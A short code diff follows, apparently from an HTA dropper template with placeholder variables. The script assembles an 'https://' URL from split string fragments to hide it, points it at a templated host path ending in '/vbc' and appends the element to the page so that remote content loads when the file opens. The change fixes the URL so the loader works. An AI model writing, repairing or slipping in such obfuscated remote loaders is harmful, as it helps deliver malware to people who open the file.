@@ -53,7 +53,7 @@
     %hta_var_01% ='H';
     %hta_var_02% ='p';
 
-    %hta_boj_01%.src = %hta_var_01% + 'tt' + %hta_var_02% +'s:/' + '%htal_link%/vbc' ;
+    %hta_boj_01%.src = %hta_var_01% + 'tt' + %hta_var_02% +'s:/' + '/%htal_link%/vbc' ;
     document.body.appendChild(%hta_boj_01%);
 </script>
 
